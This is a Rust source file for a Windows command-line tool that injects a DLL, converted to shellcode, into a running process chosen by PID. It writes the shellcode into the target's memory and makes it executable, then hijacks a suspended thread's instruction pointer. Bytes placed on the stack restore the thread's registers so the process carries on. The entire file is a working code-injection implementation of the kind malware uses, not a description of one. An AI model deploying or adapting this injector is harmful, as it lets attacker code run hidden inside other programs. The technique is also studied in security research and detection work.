use std::{
    os::raw::c_void,
    path::{Path, PathBuf},
    process::Command,
    ptr::null_mut,
};

use anyhow::{anyhow, ensure, Context};
use clap::Parser;
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError, ERROR_INSUFFICIENT_BUFFER, HANDLE},
    System::{
        Diagnostics::{
            Debug::{
                GetThreadContext, InitializeContext, ReadProcessMemory, SetThreadContext,
                WriteProcessMemory, CONTEXT, CONTEXT_FLAGS, CONTEXT_FULL_X86,
            },
            ToolHelp::{
                CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD,
                THREADENTRY32,
            },
        },
        Memory::{
            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, PAGE_EXECUTE, PAGE_PROTECTION_FLAGS,
            PAGE_READWRITE,
        },
        Threading::{
            OpenProcess, OpenThread, ResumeThread, SuspendThread, PROCESS_VM_OPERATION,
            PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT,
            THREAD_SUSPEND_RESUME,
        },
    },
};

const RESTORE_SAVED_REGS_ON_STACK_CODE: &[u8] = &[
    0x58, 0x5b, 0x59, 0x5a, 0x5d, 0x5e, 0x5f, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x41, 0x5b, 0x41,
    0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc2, 0x08, 0x10,
];
const SYSCALL_INSN_BYTES: &[u8] = &[0x0f, 0x05];

struct HandleGuard(HANDLE);
impl Drop for HandleGuard {
    fn drop(&mut self) {
        let _ = unsafe { CloseHandle(self.0) };
    }
}

#[derive(Debug, Parser)]
struct Cli {
    pid: u32,
    dll_path: PathBuf,
    dll_to_shellcode_path: Option<PathBuf>,
}

const DEFAULT_DLL_TO_SHELLCODE_PATH: &str = "C:/users/sho/Documents/DllToShellCode.exe";

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();
    let dll_to_shellcode_path = cli
        .dll_to_shellcode_path
        .unwrap_or_else(|| DEFAULT_DLL_TO_SHELLCODE_PATH.into());
    let shellcode = dll_to_shellcode(&cli.dll_path, &dll_to_shellcode_path)
        .context("failed to convert dll to shellcode")?;
    run_remote_shellcode(cli.pid, &shellcode).context("failed to run shellcode")?;
    Ok(())
}

fn dll_to_shellcode(dll_path: &Path, dll_to_shellcode_path: &Path) -> anyhow::Result<Vec<u8>> {
    let shellcode_path = dll_path.with_extension("shellcode");
    let exit_status = Command::new(dll_to_shellcode_path)
        .args(["d", "0", "0", "0"])
        .arg(dll_path)
        .arg(&shellcode_path)
        .spawn()
        .context("failed to spawn dll to shellcode command")?
        .wait()
        .context("failed to wait for dll to shellcode command")?;
    ensure!(
        exit_status.success(),
        "dll to shellcode command failed with exit code {:?}",
        exit_status.code()
    );
    std::fs::read(&shellcode_path).context("failed to read dll to shellcode output file")
}

fn run_remote_shellcode(pid: u32, shellcode: &[u8]) -> anyhow::Result<()> {
    let tid = find_first_thread_of_process(pid).context("failed to find thread of process")?;
    let proc_handle = HandleGuard(unsafe {
        OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            false,
            pid,
        )
        .context("failed to open process")
    }?);
    println!("[*] injecting to thread with TID {}", tid);
    let shellcode_addr = alloc_shellcode_in_remote_process(&proc_handle, shellcode)?;
    println!("[*] dll shellcode allocated at 0x{:x}", shellcode_addr);
    run_shellcode_in_remote_thread(&proc_handle, tid, shellcode_addr)?;
    Ok(())
}

fn get_context_size(flags: CONTEXT_FLAGS) -> anyhow::Result<usize> {
    let mut ctx_buf_size = 0;
    let err = unsafe {
        InitializeContext(None, flags, null_mut(), &mut ctx_buf_size)
            .err()
            .context("the context initialization unexpectedly succeeded with an empty buffer")?
    };

    if unsafe { GetLastError() } != ERROR_INSUFFICIENT_BUFFER {
        return Err(err)
            .context("the context initialization function failed with an unknown error");
    }
    Ok(ctx_buf_size as usize)
}

fn initialize_context(flags: CONTEXT_FLAGS) -> anyhow::Result<(Vec<u8>, *mut CONTEXT)> {
    let ctx_size = get_context_size(flags)?;
    let mut ctx_buf = vec![0u8; ctx_size];
    let mut ctx_ptr = null_mut();
    let mut ctx_length = ctx_buf.len() as u32;
    unsafe {
        InitializeContext(
            Some(ctx_buf.as_mut_ptr().cast()),
            flags,
            &mut ctx_ptr,
            &mut ctx_length,
        )
        .context("failed to initialize context")?;
    };
    let ctx_buf_ptr_range = ctx_buf.as_ptr()..unsafe { ctx_buf.as_ptr().add(ctx_size) };
    assert!(ctx_buf_ptr_range.contains(&ctx_ptr.cast::<u8>().cast_const()));
    Ok((ctx_buf, ctx_ptr))
}

fn run_shellcode_in_remote_thread(
    proc_handle: &HandleGuard,
    tid: u32,
    shellcode_addr: usize,
) -> anyhow::Result<()> {
    let thread_handle = HandleGuard(unsafe {
        OpenThread(
            THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,
            false,
            tid,
        )
        .context("failed to open thread")?
    });
    println!("[*] suspending thread");
    let res = unsafe { SuspendThread(thread_handle.0) };
    if res == u32::MAX {
        return Err(windows::core::Error::from_win32()).context("failed to suspend thread");
    }

    let (orig_ctx_buf, orig_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
    let orig_ctx = unsafe { &mut *orig_ctx_ptr };
    orig_ctx.ContextFlags = CONTEXT_FULL_X86;
    unsafe { GetThreadContext(thread_handle.0, orig_ctx).context("failed to get thread context")? };

    let (mut shellcode_ctx_buf, shellcode_ctx_ptr) = initialize_context(CONTEXT_FULL_X86)?;
    shellcode_ctx_buf.copy_from_slice(&orig_ctx_buf);
    let shellcode_ctx = unsafe { &mut *shellcode_ctx_ptr };
    shellcode_ctx.ContextFlags = CONTEXT_FULL_X86;
    shellcode_ctx.Rip = shellcode_addr as u64;
    shellcode_ctx.Rsp -= 0x1008 + core::mem::size_of::<SavedRegsOnStack>() as u64 + 8;

    let restore_shellcode_addr =
        alloc_shellcode_in_remote_process(proc_handle, RESTORE_SAVED_REGS_ON_STACK_CODE)
            .context("failed to allocate restore shellcode in remote process")?;
    println!(
        "[*] restore shellcode allocated at 0x{:x}",
        restore_shellcode_addr
    );
    write_proc_memory(
        proc_handle,
        shellcode_ctx.Rsp as usize,
        as_raw_bytes(&restore_shellcode_addr),
    )
    .context("failed to write ret ip")?;
    let bytes_before_rip = read_proc_memory(
        proc_handle,
        orig_ctx.Rip as usize - SYSCALL_INSN_BYTES.len(),
        SYSCALL_INSN_BYTES.len(),
    )
    .context("failed to read bytes before rip")?;
    let was_stopped_on_syscall = bytes_before_rip == SYSCALL_INSN_BYTES;
    let saved_regs = SavedRegsOnStack {
        rax: orig_ctx.Rax,
        rbx: orig_ctx.Rbx,
        rcx: orig_ctx.Rcx,
        rdx: orig_ctx.Rdx,
        rbp: orig_ctx.Rbp,
        rsi: orig_ctx.Rsi,
        rdi: orig_ctx.Rdi,
        r8: orig_ctx.R8,
        r9: orig_ctx.R9,
        r10: orig_ctx.R10,
        r11: orig_ctx.R11,
        r12: orig_ctx.R12,
        r13: orig_ctx.R13,
        r14: orig_ctx.R14,
        r15: orig_ctx.R15,
        ret_ip: if was_stopped_on_syscall {
            println!("[*] performing syscall restoration logic");
            orig_ctx.Rip - SYSCALL_INSN_BYTES.len() as u64
        } else {
            orig_ctx.Rip
        },
    };
    println!("[*] saved regs: {:#x?}", saved_regs);
    write_proc_memory(
        proc_handle,
        shellcode_ctx.Rsp as usize + 8,
        as_raw_bytes(&saved_regs),
    )
    .context("failed to write saved regs context to remote process")?;

    println!("[*] setting rip to 0x{:x}", shellcode_addr as u64);
    unsafe {
        SetThreadContext(thread_handle.0, shellcode_ctx).context("failed to set thread context")?
    };

    println!("[*] resuming thread");
    let res = unsafe { ResumeThread(thread_handle.0) };
    if res == u32::MAX {
        return Err(windows::core::Error::from_win32()).context("failed to resume thread");
    }
    Ok(())
}

fn as_raw_bytes<T>(value: &T) -> &[u8] {
    unsafe {
        core::slice::from_raw_parts(value as *const T as *const u8, core::mem::size_of::<T>())
    }
}

#[repr(C, packed)]
#[derive(Debug)]
struct SavedRegsOnStack {
    rax: u64,
    rbx: u64,
    rcx: u64,
    rdx: u64,
    rbp: u64,
    rsi: u64,
    rdi: u64,
    r8: u64,
    r9: u64,
    r10: u64,
    r11: u64,
    r12: u64,
    r13: u64,
    r14: u64,
    r15: u64,
    ret_ip: u64,
}

fn write_proc_memory(proc_handle: &HandleGuard, addr: usize, data: &[u8]) -> anyhow::Result<()> {
    let mut num_of_bytes_written = 0;
    unsafe {
        WriteProcessMemory(
            proc_handle.0,
            addr as *const c_void,
            data.as_ptr().cast(),
            data.len(),
            Some(&mut num_of_bytes_written),
        )
        .context("failed to write shellcode to remote process")?
    };
    ensure!(
        num_of_bytes_written == data.len(),
        "not all bytes were written"
    );
    Ok(())
}

fn read_proc_memory(proc_handle: &HandleGuard, addr: usize, len: usize) -> anyhow::Result<Vec<u8>> {
    let mut num_of_bytes_read = 0;
    let mut buf = vec![0u8; len];
    unsafe {
        ReadProcessMemory(
            proc_handle.0,
            addr as *const c_void,
            buf.as_mut_ptr().cast(),
            buf.len(),
            Some(&mut num_of_bytes_read),
        )
        .context("failed to write shellcode to remote process")?
    };
    ensure!(num_of_bytes_read == buf.len(), "not all bytes were read");
    Ok(buf)
}

fn alloc_remote(proc_handle: &HandleGuard, len: usize) -> anyhow::Result<usize> {
    let allocated_addr =
        unsafe { VirtualAllocEx(proc_handle.0, None, len, MEM_COMMIT, PAGE_READWRITE) };
    ensure!(
        !allocated_addr.is_null(),
        "failed to allocate memory in the remote process"
    );
    Ok(allocated_addr as usize)
}

fn alloc_shellcode_in_remote_process(
    proc_handle: &HandleGuard,
    shellcode: &[u8],
) -> anyhow::Result<usize> {
    let allocated_addr = alloc_remote(proc_handle, shellcode.len())?;

    write_proc_memory(proc_handle, allocated_addr, shellcode)
        .context("failed to write shellcode to remote process")?;

    let mut old_prot = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtectEx(
            proc_handle.0,
            allocated_addr as *const c_void,
            shellcode.len(),
            PAGE_EXECUTE,
            &mut old_prot,
        )
        .context("failed to make shellcode memory executable in the remote process")?
    };
    Ok(allocated_addr)
}

fn find_first_thread_of_process(pid: u32) -> anyhow::Result<u32> {
    let snapshot = HandleGuard(unsafe {
        CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .context("failed to create threads snapshot")?
    });
    let mut thread: THREADENTRY32 = unsafe { core::mem::zeroed() };
    thread.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    unsafe {
        Thread32First(snapshot.0, &mut thread)
            .context("failed to get first thread in threads snapshot")?
    };
    loop {
        if thread.th32OwnerProcessID == pid {
            return Ok(thread.th32ThreadID);
        }
        if unsafe { Thread32Next(snapshot.0, &mut thread).is_err() } {
            break;
        }
    }
    Err(anyhow!("no threads belong to pid {}", pid))
}
